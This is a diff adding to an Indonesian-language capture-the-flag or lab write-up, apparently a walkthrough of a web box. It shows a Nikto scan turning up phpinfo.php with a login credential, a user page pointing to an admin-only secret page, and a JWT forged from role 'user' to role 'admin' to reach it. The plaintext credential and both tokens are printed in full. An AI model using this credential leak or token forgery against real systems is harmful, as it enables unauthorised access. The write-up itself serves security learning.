@@ -122,3 +122,31 @@ Nikto
 Pada scan menggunakan nikto terdapat file `phpinfo.php` yang terdapat informasi credential user untuk login `Charis:14m@we50m3`
 
 ![alt text](images/credential.png)
+
+Setelah login hanya terdapat 1 halaman untuk dilihat user tapi pada checklist di halaman tersebut mengatakan ada halaman `secret` yang hanya bisa di akses oleh admin.
+
+![alt text](images/user-page.png)
+
+
+Memanipulasi Role jwt token dari user menjadi admin untuk mengakses `secret page`
+
+```
+JWT TOKEN
+
+{"typ":"JWT","alg":"HS256"}{"username":"Charis","role":"user","realm":"Atulieer"}'-DN`du3N)Cؾ
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkNoYXJpcyIsInJvbGUiOiJ1c2VyIiwicmVhbG0iOiJBdHVsaWVlciJ9.JxMtw-7yxRpETqJgZAWGpx11ujOKThcVKcJDnu_Yvvo
+
+
+CUSTOM JWT TOKENS
+
+{"typ":"JWT","alg":"HS256"}{"username":"Charis","role":"admin","realm":"Atulieer"}�em#.P|/LS'
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkNoYXJpcyIsInJvbGUiOiJhZG1pbiIsInJlYWxtIjoiQXR1bGllZXIifQ.BljW2JHQQjz_guCp2eBB9Q_b31ta58L7CLrdZMs1Mns
+
+```
+
+![alt text](images/secret-page.png)
+
+
+ 
